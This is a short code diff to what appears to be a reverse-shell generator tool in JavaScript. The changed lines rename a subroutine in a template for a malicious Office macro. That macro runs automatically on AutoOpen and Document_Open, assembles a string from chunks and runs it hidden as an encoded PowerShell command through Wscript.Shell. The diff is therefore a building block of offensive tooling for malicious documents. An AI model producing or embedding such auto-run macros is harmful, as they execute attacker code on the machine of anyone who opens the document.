@@ -229,14 +229,14 @@ const rsg = {
         const macroLines = chunks.map((chunk, index) => `    str = str + "${chunk}"`);
         const macro = [
             'Sub AutoOpen()',
-            '    macrogen',
+            '    MyMacro',
             'End Sub',
             '',
             'Sub Document_Open()',
-            '    macrogen',
+            '    MyMacro',
             'End Sub',
             '',
-            'Sub macrogen()',
+            'Sub MyMacro()',
             '    Dim str As String',
             ...macroLines,
             '    CreateObject("Wscript.Shell").Run "powershell -e " & str, 0',
